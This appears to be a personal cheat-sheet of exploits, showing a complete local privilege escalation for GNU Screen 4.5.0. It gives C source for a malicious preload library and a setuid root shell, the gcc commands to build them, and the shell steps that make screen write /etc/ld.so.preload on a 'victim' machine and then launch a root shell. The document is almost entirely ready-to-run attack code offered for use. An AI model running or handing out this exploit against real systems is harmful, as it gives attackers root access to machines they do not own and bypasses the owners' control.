# Exploits and CVEs

Some useful exploits.

___

### GNU Screen 4.5.0 - Local Privilege Escalation 

**libhax.so**

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

**rootshell.c**

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

Compile both files and transfer them to victim's machine.

```bash
kali@kali:~$ gcc -fPIC -shared -ldl -o libhax.so libhax.c
kali@kali:~$ gcc -static -o rootshell rootshell.c
```

After transfer:

```bash
victim@machine:/tmp$ cd /etc
victim@machine:/etc$ umask 000 # because
victim@machine:/etc$screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
victim@machine:/etc$ screen -ls
victim@machine:/etc$ /tmp/rootshell
```

___